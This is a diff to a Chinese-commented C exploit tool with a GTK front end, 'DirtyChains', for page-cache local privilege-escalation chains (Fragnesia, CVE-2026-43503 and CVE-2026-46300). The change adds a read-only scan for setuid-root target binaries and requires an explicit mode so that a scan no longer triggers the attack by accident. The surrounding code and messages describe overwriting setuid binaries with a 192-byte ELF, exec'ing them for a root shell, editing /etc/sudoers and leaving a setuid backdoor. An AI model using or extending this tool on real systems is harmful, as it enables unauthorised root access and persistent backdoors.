@@ -59,6 +59,7 @@
 
 #include <arpa/inet.h>
 #include <ctype.h>
+#include <limits.h>
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -3615,6 +3616,8 @@ static void usage(const char *prog)
     pr_raw("  跑完记得删掉；/etc/sudoers 如果被追加，重启前请先 visudo -c 检查。\n\n");
 }
 
+static int dc_scan_setuid(void);   /* 定义在 Fragnesia 段之前，这里先用 */
+
 int ovswrap_main(int argc, char **argv)
 {
     int mode = 0;
@@ -3629,6 +3632,8 @@ int ovswrap_main(int argc, char **argv)
             mode = 1;
         else if (!strcmp(argv[i], "-scan") || !strcmp(argv[i], "-test"))
             mode = 2;
+        else if (!strcmp(argv[i], "-find"))
+            mode = 5;           /* 只读扫描, 与 KSU 无关, 不碰 sudoers */
         else if (!strcmp(argv[i], "-start"))
             mode = 3;
         else if (!strcmp(argv[i], "-v"))
@@ -3691,6 +3696,9 @@ int ovswrap_main(int argc, char **argv)
 
     if (mode == 4)
         return do_dump_krec();   /* 不打 banner，stdout 只留 JSON */
+
+    if (mode == 5)
+        return dc_scan_setuid();
 
     banner();
 
@@ -3781,6 +3789,135 @@ int ovswrap_main(int argc, char **argv)
         pr_err("exec sudo 失败: %s\n", strerror(errno));
         return 1;
     }
+}
+
+/* ===========================================================================
+ *  共用：setuid root 文件扫描（-find）
+ *
+ *  这个模式必须是纯只读的：不建 userns、不碰 XFRM、不写一个字节的页缓存。
+ *  之前 46300 / 43503 两个引擎都没有 -find 分支，参数被静默忽略后落到默认的
+ *  -start —— 界面上点「扫描 setuid」会直接开始改写目标并 exec 它，看着就是
+ *  「点了扫描却自己提权」。现在两个入口都接上这个函数，并且强制要求显式指定
+ *  模式，拼错参数一律报错退出，不再猜。
+ * ======================================================================== */
+#define DC_SCAN_MIN    4096
+#define DC_SCAN_DEPTH  6
+
+/* 目标所在挂载点是否带 nosuid：带的话 setuid 位会被内核忽略，写了也提不了权 */
+static int dc_mount_nosuid(const char *path)
+{
+    FILE *f = fopen("/proc/mounts", "r");
+    char dev[256], mnt[512], opts[256];
+    size_t bestlen = 0;
+    int nosuid = 0;
+
+    if (!f)
+        return 0;
+    while (fscanf(f, "%255s %511s %*s %255s %*s %*s", dev, mnt, opts) == 3) {
+        size_t l = strlen(mnt);
+
+        if (strncmp(path, mnt, l) != 0)
+            continue;
+        if (path[l] != '\0' && path[l] != '/' && l != 1)
+            continue;
+        if (l >= bestlen) {
+            bestlen = l;
+            nosuid = (strstr(opts, "nosuid") != NULL);
+        }
+    }
+    (void)dev;
+    fclose(f);
+    return nosuid;
+}
+
+static void dc_scan_dir(const char *dir, int depth, int *total, int *usable)
+{
+    DIR *d = opendir(dir);
+    struct dirent *de;
+
+    if (!d)
+        return;
+    if (depth > DC_SCAN_DEPTH) {
+        closedir(d);
+        return;
+    }
+
+    while ((de = readdir(d)) != NULL) {
+        char p[PATH_MAX];
+        struct stat st;
+
+        if (de->d_name[0] == '.')
+            continue;
+        if (snprintf(p, sizeof(p), "%s/%s", dir, de->d_name) >= (int)sizeof(p))
+            continue;
+        if (lstat(p, &st) < 0)
+            continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            if (!strcmp(de->d_name, "proc") || !strcmp(de->d_name, "sys") ||
+                !strcmp(de->d_name, "dev") || !strcmp(de->d_name, "run") ||
+                !strcmp(de->d_name, "tmp"))
+                continue;
+            dc_scan_dir(p, depth + 1, total, usable);
+            continue;
+        }
+        if (!S_ISREG(st.st_mode) || !(st.st_mode & S_ISUID))
+            continue;
+        if (st.st_uid != 0 || !(st.st_mode & S_IXUSR))
+            continue;
+
+        (*total)++;
+
+        if ((long long)st.st_size < DC_SCAN_MIN) {
+            printf("[-] %-44s %9lld B  too small\n", p, (long long)st.st_size);
+            continue;
+        }
+        if (access(p, W_OK) == 0) {
+            printf("[-] %-44s %9lld B  writable by you\n", p,
+                   (long long)st.st_size);
+            continue;
+        }
+        if (dc_mount_nosuid(p)) {
+            printf("[!] %-44s %9lld B  nosuid mount\n", p, (long long)st.st_size);
+            continue;
+        }
+        printf("[+] %-44s %9lld B\n", p, (long long)st.st_size);
+        (*usable)++;
+    }
+    closedir(d);
+}
+
+static int dc_scan_setuid(void)
+{
+    static const char *roots[] = {
+        "/usr/bin", "/usr/sbin", "/bin", "/sbin",
+        "/usr/lib", "/usr/libexec", "/usr/local/bin",
+        "/usr/local/sbin", "/opt", NULL
+    };
+    int total = 0, usable = 0, i;
+
+    printf("[*] 扫描 setuid root 文件（只读：不建 userns、不碰 XFRM、不写任何文件）\n");
+    printf("[*] 判定: 普通文件 uid=0 有 u+x, >= %d B, 当前用户不可写, 非 nosuid\n",
+           DC_SCAN_MIN);
+    if (geteuid() == 0)
+        printf("[!] 当前是 root：root 对任何文件都有写权限，下面会全部标成 "
+               "writable by you，这个判定只对普通用户有意义\n");
+    printf("\n");
+
+    for (i = 0; roots[i]; i++)
+        dc_scan_dir(roots[i], 0, &total, &usable);
+
+    printf("\n[*] 共 %d 个 setuid root 文件, 其中 %d 个可用作靶子\n", total, usable);
+    if (usable) {
+        printf("[*] 用法: -t <'[+]' 的路径> -test 先自测, 确认能过再 -start\n");
+        printf("[!] 直接打进系统文件会留下一个 setuid root 的后门 shell, 用完必须"
+               "重装该包: apt-get install --reinstall -y <包名>\n");
+    } else {
+        printf("[-] 没有可用靶子。自己造一个副本:\n");
+        printf("    sudo cp /usr/bin/su /var/tmp/t && sudo chown root:root "
+               "/var/tmp/t && sudo chmod 4755 /var/tmp/t\n");
+    }
+    return usable ? 0 : 1;
 }
 
 /* ==========================================================================
@@ -5039,9 +5176,13 @@ static int replace_existing_bytes_after(uint64_t byte_off,
 
 static void frag_usage(const char *prog)
 {
-	fprintf(stderr, "usage: %s [target-file] [offset] [hex-bytes]\n", prog);
-	fprintf(stderr, "  target-file 默认 /usr/bin/su，offset 默认 0，"
-			"hex-bytes 默认内置 192 字节 ELF\n");
+	fprintf(stderr, "usage: %s -check|-test|-start|-find [-t target] "
+			"[-offset N]\n", prog);
+	fprintf(stderr, "  -check   只探测前置条件, 不改写任何文件\n");
+	fprintf(stderr, "  -test    写 192 字节到页缓存并回读校验, 不 exec 目标\n");
+	fprintf(stderr, "  -start   写成功后 exec 目标\n");
+	fprintf(stderr, "  -find    只列 setuid root 候选靶子, 不碰 userns/XFRM\n");
+	fprintf(stderr, "  target 默认 /usr/bin/su, offset 默认 0\n");
 	fprintf(stderr, "  FRAGNESIA_PLAIN=1 不画 hex 帧；"
 			"FRAGNESIA_NO_SHELL=1 最后不 exec 目标\n");
 }
@@ -5126,6 +5267,7 @@ int fragnesia_run(int argc, char **argv)
 	return ret;
 }
 
+
 /* ---------------------------------------------------------------------------
  * 对外入口：既接受上游的位置参数（fragnesia TARGET OFFSET HEX），
  * 也接受 GUI 用的开关形式（-start / -test / -check / -t / -offset）。
@@ -5136,6 +5278,7 @@ int fragnesia_main(int argc, char **argv)
     const char *target = NULL, *off = NULL, *hexb = NULL;
     char *pa[6];
     int check = 0, i, pn = 0;
+    int mode = -1;              /* -1 未指定 / 0 start / 1 test / 2 check / 3 find */
 
     /* GUI 的日志视图画不了 hex 帧（一堆光标定位），只留进度行 */
     setenv("FRAGNESIA_PLAIN", "1", 1);
@@ -5144,12 +5287,16 @@ int fragnesia_main(int argc, char **argv)
         const char *s = argv[i];
 
         if (!strcmp(s, "-start")) {
-            /* 默认行为：改完直接 exec 目标，把当前会话变成 root shell */
+            mode = 0;           /* 改完直接 exec 目标，把当前会话变成 root shell */
         } else if (!strcmp(s, "-test")) {
+            mode = 1;
             setenv("FRAGNESIA_NO_SHELL", "1", 1);
         } else if (!strcmp(s, "-check")) {
+            mode = 2;
             check = 1;
             setenv("FRAGNESIA_CHECK_ONLY", "1", 1);
+        } else if (!strcmp(s, "-find")) {
+            mode = 3;           /* 只列 setuid 候选，一个字节都不写 */
         } else if (!strcmp(s, "-t") && i + 1 < argc) {
             target = argv[++i];
         } else if (!strcmp(s, "-offset") && i + 1 < argc) {
@@ -5158,7 +5305,10 @@ int fragnesia_main(int argc, char **argv)
             frag_usage("fragnesia");
             return 2;
         } else if (s[0] == '-' && s[1]) {
-            continue;               /* -v / -nobackup / 链编号之类，忽略 */
+            /* 以前这里是 continue，于是 "-find" 这种没实现的开关被静默吃掉，
+               程序按默认的 -start 跑 —— 点「扫描」结果直接提权。现在不猜。 */
+            fprintf(stderr, "fragnesia: 未知参数 %s\n", s);
+            return 2;
         } else if (!target) {
             target = s;
         } else if (!off) {
@@ -5167,6 +5317,14 @@ int fragnesia_main(int argc, char **argv)
             hexb = s;
         }
     }
+
+    if (mode < 0) {
+        fprintf(stderr, "fragnesia: 必须显式指定 -check / -test / -start / -find\n");
+        frag_usage("fragnesia");
+        return 2;
+    }
+    if (mode == 3)
+        return dc_scan_setuid();
 
     if (check)
         printf(C_BCYN "[*]" C_RESET " 只探测前置条件, 不改写任何文件\n");
@@ -5606,17 +5764,18 @@ static int dc43503_write_payload(void)
 static void dc43503_usage(const char *prog)
 {
     fprintf(stderr,
-        "usage: %s [-start|-test|-check] [-t target] [-offset N] [-v]\n"
+        "usage: %s -start|-test|-check|-find [-t target] [-offset N] [-v]\n"
         "  -check   只探测 userns/netns + XFRM, 不写任何文件\n"
         "  -test    写 192 字节到目标页缓存并回读校验, 不 exec\n"
-        "  -start   写成功后 exec 目标（默认行为）\n"
+        "  -start   写成功后 exec 目标\n"
+        "  -find    只列 setuid root 候选靶子, 不碰 userns/XFRM\n"
         "  -t       目标文件, 默认 /usr/bin/su；需 >= 4096 字节且对当前用户不可写\n"
         "  -offset  起始偏移, 默认 0（按 4 字节粒度）\n", prog);
 }
 
 int cve43503_main(int argc, char **argv)
 {
-    int mode = 0;               /* 0=start 1=test 2=check */
+    int mode = -1;              /* -1 未指定 / 0 start / 1 test / 2 check / 3 find */
     int i, rc;
 
     for (i = 1; i < argc; i++) {
@@ -5628,6 +5787,8 @@ int cve43503_main(int argc, char **argv)
             mode = 1;
         else if (!strcmp(s, "-check"))
             mode = 2;
+        else if (!strcmp(s, "-find"))
+            mode = 3;
         else if (!strcmp(s, "-t") && i + 1 < argc)
             dc43503_target = argv[++i];
         else if (!strcmp(s, "-offset") && i + 1 < argc)
@@ -5637,10 +5798,22 @@ int cve43503_main(int argc, char **argv)
         else if (!strcmp(s, "-h") || !strcmp(s, "--help")) {
             dc43503_usage("dirtychains");
             return 2;
+        } else if (s[0] == '-' && s[1]) {
+            fprintf(stderr, "cve43503: 未知参数 %s\n", s);
+            return 2;
         }
     }
     if (getenv("DIRTYFRAG_VERBOSE"))
         dc43503_verbose = 1;
+
+    if (mode < 0) {
+        fprintf(stderr,
+                "cve43503: 必须显式指定 -check / -test / -start / -find\n");
+        dc43503_usage("dirtychains");
+        return 2;
+    }
+    if (mode == 3)
+        return dc_scan_setuid();
 
     printf("[*] uid=%d euid=%d target=%s offset=%lld\n",
            (int)getuid(), (int)geteuid(), dc43503_target,
@@ -5683,7 +5856,7 @@ int cve43503_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-11-01-r34"
+#define DF_BUILD        "2026-11-01-r35"
 #define APP_SUBTITLE    "八链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
@@ -6402,6 +6575,32 @@ static void on_child_exit(GPid pid, gint status, gpointer data)
     a->pid = 0;
     a->child_id = 0;
     a->running = FALSE;
+
+    /* 扫描 setuid 是纯只读探测，退出码含义和别的动作不通用：
+       0 = 找到可用靶子, 1 = 一个都没有, 其它 = 环境错。
+       这里必须先于各引擎的映射处理，否则 0 会被读成「有漏洞」、
+       1（46300）会被读成「打穿了」，看着就像扫描在提权。 */
+    if (a->action && strstr(a->action, "扫描")) {
+        char sline[200];
+
+        if (code == 0) {
+            verdict = "扫描完成：有可用靶子 (退出码 0)";
+            color = "status-ok";
+        } else if (code == 1) {
+            verdict = "扫描完成：没有可用靶子 (退出码 1)";
+            color = "status-warn";
+        } else {
+            verdict = (code > 128) ? "扫描被信号终止" : "扫描异常退出";
+            color = "status-err";
+        }
+        g_snprintf(sline, sizeof(sline), "\n── 进程结束: %s ──\n", verdict);
+        log_flush(a);
+        log_append_plain(a, sline);
+        gtk_widget_set_name(a->status_lbl, color);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);
+        app_set_busy(a, FALSE);
+        return;
+    }
 
     /* CVE-2026-46300 的退出码和别的链反着来: 1 = 有漏洞, 0 = 没打成 */
     {
